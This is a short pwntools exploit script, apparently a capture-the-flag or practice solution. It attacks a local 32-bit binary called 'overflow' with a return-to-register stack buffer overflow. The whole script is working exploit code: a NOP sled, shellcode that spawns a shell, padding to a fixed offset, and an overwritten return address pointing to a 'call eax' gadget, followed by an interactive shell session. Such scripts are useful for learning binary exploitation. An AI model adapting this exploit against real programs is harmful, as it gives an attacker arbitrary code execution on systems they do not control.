from pwn import *
context(os='linux', arch='i386')
context.log_level='debug'
proc = process('./overflow')
OFFSET = 316
out = proc.read()
print(out)
pause()
# EAX_ADD = 0xffe6ba90
# objdump -D overflow | grep eax | grep call
CALL_EAX = 0x8049019
payload = b'\x90'*30
payload += asm(shellcraft.sh())
payload += b'\x90'*(OFFSET - len(payload))
payload += p32(CALL_EAX)
# Ret2Reg Style Exploit
proc.writeline(payload)
out = proc.interactive()
# print(out)